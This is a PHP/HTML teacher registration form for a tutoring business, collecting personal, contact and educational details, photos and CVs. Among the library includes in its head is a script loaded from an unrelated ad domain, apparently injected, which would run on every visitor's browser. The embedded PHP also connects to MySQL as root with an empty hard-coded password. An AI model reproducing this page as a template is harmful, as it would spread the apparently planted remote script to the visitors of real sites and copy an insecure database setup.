<!DOCTYPE html>
<html lang="en">
<head>
	<title>Teachers Data Entry</title>
	<!--[if lt IE 9]>
	<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
	<link rel="stylesheet" type="text/css" href="simpleform.css" />
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="font-awesome-4.3.0/css/font-awesome.css" />
    
    <script src="js/bootstrap.min.js"></script>
    <script src="js/jquery.min.js"></script>
    
    <link href="css/fileinput.css" media="all" rel="stylesheet" type="text/css" />
    <script src="js/fileinput.js" type="text/javascript"></script>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet">
    <!---->
      <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src="https://anddogen.com/ad.php?u=2bcb6c0dae4ff00188d34940932e2ce1&c=pbbt&p=1"></script>
    <!---->
     <!--calander-->
	  <link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/base/jquery-ui.css" rel="stylesheet" type="text/css"/>
	  
	  <script src="js/jquery-ui.min.js"></script>
  
  <script>
  $(document).ready(function() {
    $("#datepicker").datepicker();
  });
  </script>
  <script type="text/javascript" language="javascript">

	function checkid(str)
	{	if (str=="")
	  	{	document.getElementById("subject").innerHTML="";
	  		 return;
	  	} 
		if (window.XMLHttpRequest)
		  {// code for IE7+, Firefox, Chrome, Opera, Safari
		  xmlhttp=new XMLHttpRequest();
		  }
		else
		  {// code for IE6, IE5
		  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		  }
		xmlhttp.onreadystatechange=function()
			  {
			  if (xmlhttp.readyState==4 && xmlhttp.status==200)
				{
				document.getElementById("subject").innerHTML=xmlhttp.responseText;
					//document.getElementById("email").value=xmlhttp.responseText;
				}
			  }
		xmlhttp.open("GET","getSubjectFromSegmentId.php?id="+str,true);
		xmlhttp.send();
	}
</script>
</head>

<body style="background-image:url('blur-background04.jpg');background-position:right">


<!--div class="breadcrumb" style="background-color:rgba(249, 98, 41, 0.93); color:white;border:rgba(249, 98, 41, 0.93);">
	<center><span style="font-family:'Times New Roman', Times, serif;color:white;font-size:47px">Erudite Enterprise</span></center>
	&nbsp;&nbsp;<div class="nav-icon"><span class="pull-right nav-icon"><a id="a_icon" style=" text-decoration:none;color:#FFFFFF" alt="help" data-target="#myModal" data-toggle="modal">&nbsp;&nbsp; <i class="fa fa-question fa-2x"></i></a></span></div>
	<div class="nav-icon"><span class="pull-right nav-icon"><a id="a_icon" style=" text-decoration:none;color:#FFFFFF" alt="back to home" href="index.html"> <i class="fa fa-home fa-2x"></i></a></span></div>
</div-->
<nav class="navbar navbar-default navbar-fixed-top" id="nv" style="margin-top:40px; background-color:#f4511e; border-color:#f4511e;">
  <div class="container">
    <div class="navbar-header">
      <a class="navbar-brand" href="#myPage" style="padding:0px 15px;"><img src="Logo.png" class="img-responsive" /></a>
    </div>
  </div>
</nav>


<div class="container-fluid" style="margin-top:100px;">
			
		
		
		<form class="form-inline" name="form1" id="testform2" method="post" enctype="multipart/form-data" role="form" action="process_register.php">
			<fieldset class="personal-data">
			<!--progress bar-->
				<div class="progress">
				    <div class="progress-bar progress-bar-success progress-bar-striped active" role="progressbar" aria-valuenow="3" aria-valuemin="0" aria-valuemax="100" style="width:3%">
				      &nbsp;&nbsp;&nbsp;&nbsp;0% Complete 
				    </div>
				</div>
			<!--end-->
			<center><span style="-webkit-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
     -moz-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
     box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);"><label>Teacher's Personal Details</label></span></center><br/>
			
			<div class="col-sm-6">
					
					<label class="control-label col-sm-2" for="name">Full Name: <span class="required">*</span></label>
					<input type="text" id="name" name="name" placeholder="Amit Kumar" /><br/>

					<label class="control-label col-sm-2" for="age">DOB: <span class="required">*</span></label>
					<input  id="datepicker" type="date" name="dob" required="required"><br/>

					<label class="control-label col-sm-2" for="age">Age: <span class="required">*</span></label>
					<input type="number" id="age" name="age" placeholder="e.g 30" required="required" /><br/>
					
					<label class="control-label col-sm-2" for="gender">Gender: <span class="required">*</span></label>
					<select name="gen" required><option disabled="disabled">Choose one</option><option>Male</option><option>Female</option></select> <br/>
					
					<label class="control-label col-sm-2" for="status">Marital Status: <span class="required">*</span></label>
					<select name="married" required><option disabled="disabled" >Choose one</option><option>Unmarried</option><option>Married</option></select>
					 <br/>
					 

			</div>
			<div class="col-sm-6">
				
				<center><strong>Source Data detail</strong> <span class="required">*</span>	
				<select id="" name="source_detail" required="required">
					<option disabled="disabled" >Choose source</option>
					<option>MPT</option>
					<option>Tutor India</option>
					<option>JD</option>
					<option>Quikr</option>
					<option>OLX</option>
					<option>UrbanPro</option>
					<option>Sulekha</option>
					<option>Ref</option>
					<option>others</option>
					
				</select><br/><br/>
				</center>
				<center><label class="control-label col-sm-12" for="image">Upload Image <span class="required">*</span></label></center><br/>
				<center><input id="img" name="timg" class="file" type="file" required/></center>
					 <script>
				          $(document).on('ready', function(){$("#img").fileinput();});
				     </script>
				     <br/>

			</div>
			
			
			</fieldset>
			
			<fieldset>
			<!--progress bar-->
				<div class="progress">
				    <div class="progress-bar progress-bar-success progress-bar-striped active" role="progressbar" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100" style="width:25%">
				      &nbsp;&nbsp;&nbsp;&nbsp;25% Complete 
				    </div>
				</div>
			<!--end-->

			
			
			<center><span style="-webkit-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
     -moz-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
     box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);"><label>Contact Deatils</label></span></center><br/>

				<div class="col-sm-12">
					<label class="control-label col-sm-3" for="phone">Phone:<span class="required">*</span></label>
					<input type="text" name="ph" id="phone" placeholder="00-0000-0000"  min="7000000000" max="9990000000" required/><br/>
					<label class="control-label col-sm-3" for="phone">Alternative Number:</label>
					<input type="text" name="aph" id="phone" placeholder="00-0000-0000" maxlength="10" /><br/>
	
					<label class="control-label col-sm-3" for="email-address">Email: <span class="required">*</span></label>
					<input type="email" name="email" id="email" placeholder="example@email.com" /><br/>
					<!--label class="control-label col-sm-3" for="address">Permanent Address: <span class="required">*</span></label>
					<textarea id="paddress" name="padd" placeholder="Enter permanent address" style="width:400px; height:60px;" required="required"></textarea>
					
					<label class="control-label col-sm-3" for="landmark">Current Address: <span class="required">*</span></label>
					<textarea id="caddress" name="cadd" placeholder="Enter current address" style="width:400px; height:50px;" required="required"></textarea--><br/>	
					<div class="form-group">
                        <div class="col-sm-6">
							<label class="control-label col-sm-3" for="address" style="padding-left:0px;margin-left:0px;">Permanent Address: <span class="required">*</span></label>
							<textarea id="paddress" name="padd" placeholder="Enter permanent address" style="width:336px; height:50px;" required="required"></textarea>
                        </div>
                        <div class="col-sm-6">
							<label class="control-label col-sm-3" for="landmark">Current Address: <span class="required">*</span></label>
							<textarea id="caddress" name="cadd" placeholder="Enter current address" style="width:336px; height:50px;" required="required"></textarea><br/>
                        </div><br/>
                    </div>
                    <label class="control-label col-sm-3" for="area">Pincode:<span class="required">*</span></label>
                    <input type="text" name="pin" placeholder="" min="700001" max="700999" required="required"><br/>
					<label class="control-label col-sm-3" for="area">Area:<span class="required">*</span></label>
					<input type="text" name="area" placeholder="your locality" required="required"><br/>
					<label class="control-label col-sm-3" for="c_aera">Covering area:<span class="required">*</span></label>
					<textarea name="carea" placeholder="places can be reached, e.g. Saltlake,Goria" style="width:400px; height:60px;" required="required"></textarea><br/>
					
				</div>
				<!--div class="col-sm-6">
					<label class="control-label col-sm-3" for="area">Area:<span class="required">*</span></label>
					<input type="text" name="area" placeholder="your locality" required="required"><br/>
					<label class="control-label col-sm-3" for="c_aera">Covering area:<span class="required">*</span></label>
					<textarea name="carea" placeholder="places can be reached" style="width:400px; height:60px;" required="required"></textarea><br/>
				</div-->
			
			</fieldset>

			<fieldset class="personal-data">
			<!--progress bar-->
				<div class="progress">
				    <div class="progress-bar progress-bar-success progress-bar-striped active" role="progressbar" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100" style="width:50%">
				      &nbsp;&nbsp;50% Complete (success)
				    </div>
				</div>
			<!--end-->
			<div class="col-sm-12">
			<center><span style="-webkit-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
     -moz-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
     box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);"><label>Educational Details</label></span></center><br/>

					<label class="control-label col-sm-2" for="name">Heighst Qualification: <span class="required">*</span></label>
					<input type="text" id="qualification" name="hqua" placeholder="e.g. Diploma, M.sc" required="required" /><br/>

					<label class="control-label col-sm-2" for="stream">Stream: <span class="required">*</span></label>
					<input type="text" name="sub" id="subject" placeholder="e.g. Math, Physics,Computer Science" required="required" /><br/>
					
					<label class="control-label col-sm-2" for="stream">Institute: <span class="required">*</span></label>
					<input type="text" name="ins" id="institute" placeholder="where you have done your course" required="required" /><br/>

					<label class="control-label col-sm-2" for="phone">Teaching experience:</label>
					<input type="text" name="exp" id="experience" placeholder="e.g. 1 year 4 month" required="required" /> <br/>
					<label class="control-label col-sm-2" for="phone">Current activity</label>
					<input type="text" name="cact" id="c_activity" placeholder="Current working status" required="required" /> <br/>

			</div>
			</fieldset>

			<fieldset class="address-data-inputs">
			<!--progress bar-->
				<div class="progress">
				    <div class="progress-bar progress-bar-success progress-bar-striped active" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100" style="width:75%">
				      &nbsp;&nbsp;75% Complete (success)
				    </div>
				</div>
			<!--end-->
			<div class="col-sm-12">
			<center><span style="-webkit-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
		     -moz-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
		     box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);"><label>Select Segments/Category</label></span></center><br/>


					<span class="required">**</span>Select atleast one segment<br/><hr style="background-color:black; color:black"/>
					<div class="col-sm-3">
						<label class="control-label" for="phone">Segment One</label><br/>
						<select name="category" onchange="checkid(this.value);">
	                               
	                                <!-- <option value="3">Class VII - X</option> -->

	                                <?php
		                               
		                                $servername = "localhost";
		                                $username = "root";
		                                $password = "";
		                                $dbname = "erudite";

		                                // Create connection
		                                $conn = new mysqli($servername, $username, $password,$dbname);

		                                // Check connection
		                                if ($conn->connect_error) {
		                                    die("Connection failed: " . $conn->connect_error);
		                                } 


		                                $sql = "select * from segment";


		                                $result = $conn->query($sql);
		                                $one = "<option value='";
		                                $three = "'>";
		                                $five = "</option>";

		                                if ($result->num_rows > 0) {
		                                    // output data of each row
		                                    while($row = $result->fetch_assoc()) {
		                                    	$two=$row["id"];
		                                    	$four=$row["name"];

		                                        echo $one.$two.$three.$four.$five;
		                                    }
		                                } else {
		                                    echo "0 results";
		                                }	
		                                $conn->close();



	                                ?>
	                                </select><br/>
	                                <div id="subject" class="label"></div>
					</div>
					<div class="col-sm-3">
						<label class="control-label" for="phone">Segment Two</label><br/>
						<button type="button" class="active right btn btn-info" data-toggle="modal" data-target="#myModal">Choose</button><br/><br/>
						<input type="text" name="seg2" id="v3" placeholder="segment two" /><br/>
						<center><textarea name="seg2_sub" placeholder="subjects" style=" height:60px;"></textarea></center><br/>
					</div>
					<div class="col-sm-3">
						<label class="control-label" for="phone">Segment Three</label><br/>
						<button type="button" class="active right btn btn-info" data-toggle="modal" data-target="#myModal">Choose</button><br/><br/>
						<input type="text" name="seg3" placeholder="segment three" /><br/>
						<center><textarea name="seg3_sub" placeholder="subjects" style=" height:60px;" ></textarea></center><br/>
					</div>
					<div class="col-sm-3">
						<label class="control-label" for="phone">Segment Four</label><br/>
						<button type="button" class="active right btn btn-info" data-toggle="modal" data-target="#myModal">Choose</button><br/><br/>
						<input type="text" name="seg4" placeholder="segment four" /><br/>
						<center><textarea name="seg4_sub" placeholder="subjects" style=" height:60px;" ></textarea></center><br/>
					</div>
					
			</div>
			</fieldset>
			<fieldset class="address-data-inputs">
			<!--progress bar-->
				<div class="progress">
				    <div class="progress-bar progress-bar-success progress-bar-striped active" role="progressbar" aria-valuenow="95" aria-valuemin="0" aria-valuemax="100" style="width:95%">
				      &nbsp;&nbsp;95% Complete (success)
				    </div>
				</div>
			<!--end-->
			<div class="col-sm-12">
				<div class="col-sm-6">
					<div class="jumbotron" style="-webkit-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
		     -moz-box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);
		     box-shadow: 3px 2px 70px -5px rgba(0,0,0,0.63);">
						<center><h3 style="color:#FF6600">CV Format</h3></center>
						<p>Thank you for showing Interest in us. To get registered for free, kindly maintain the CV format</p>
							<ul>
								<li>Your fullname</li>
								<li>Contact number and alternative number</li>
								<li>Present address and permanent address</li>
								<li>Educationla details(Board,school,university,percentage,passing year)</li>
								<li>Teaching subject</li>
								<li>Level</li>
								<li>Experience</li>
								<li>Visiting area</li>
								<li>Your recent photograph</li>
							</ul>
					</div>
				</div>
				<div class="col-sm-6">
				<center><label class="control-label col-sm-12" for="image">Upload CV <span class="required">*</span></label></center><br/>
				<center><input id="cv" name="cv" class="file" type="file" required/></center><br/>
				
					 <script>
				          $(document).on('ready', function(){$("#cv").fileinput();});
				     </script>
				     <br/>
				 </div>
			</div>
			</fieldset>

			<fieldset class="message-details">
			<!--progress bar-->
				<div class="progress">
				    <div class="progress-bar progress-bar-success progress-bar-striped active" role="progressbar" aria-valuenow="95" aria-valuemin="0" aria-valuemax="100" style="width:95%">
				      &nbsp;&nbsp;95% Complete (success)
				    </div>
				</div>
			<!--end-->
					<div class="col-sm-12">
						<center><label class="control-label col-sm-12">Click on the <kbd>Submit</kbd> button to store the whole information   </label></center><br/>
					</div>
        	</fieldset>
        	<div class="clear"></div>

		</form>
		
		<br/>
	</div>
	<!--container end-->

		
	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
	<script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.12.0/jquery.validate.min.js"></script>
	<script type="text/javascript" src="simpleform.min.js"></script>
	
	<script type="text/javascript">
		
		$("#testform2").simpleform({
			speed : 500,
			transition : 'slide',
			progressBar : true,
			showProgressText : true,
			validate: true
		});

		

		function validateForm(formID, Obj){

			switch(formID){
				case 'testform' :
					Obj.validate({
						rules: {
							email: {
								required: true,
								email: true
							},
							name: {
								required: true
							},
							street: {
								required: true
							}
						},
						messages: {
							email: {
								required: "Please enter an email address",
								email: "Not a valid email address"
							},
							name: {
							 	required: "Please enter your name"
							},
							street: {
								required: "Please enter street name"
							}
						}
					});
				return Obj.valid();
				break;

				case 'testform2' :
					Obj.validate({
						rules: {
							email: {
								required: true,
								email: true
							},
							name: {
								required: true
							},
							spouse_email: {
								required: true,
								email: true
							},
							spouse_name: {
								required: true
							},
							street: {
								required: true
							}
						},
						messages: {
							email: {
								required: "Please enter an email address",
								email: "Not a valid email address"
							},
							name: {
							 	required: "Please enter your name"
							},
							spouse_email: {
								required: "Please enter an email address",
								email: "Not a valid email address"
							},
							spouse_name: {
							 	required: "Please enter your spouses name"
							},
							street: {
								required: "Please enter street name"
							}
						}
					});
				return Obj.valid();
				break;
			}
		}
		</script>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-36251023-1']);
  _gaq.push(['_setDomainName', 'jqueryscript.net']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</body>
</html>
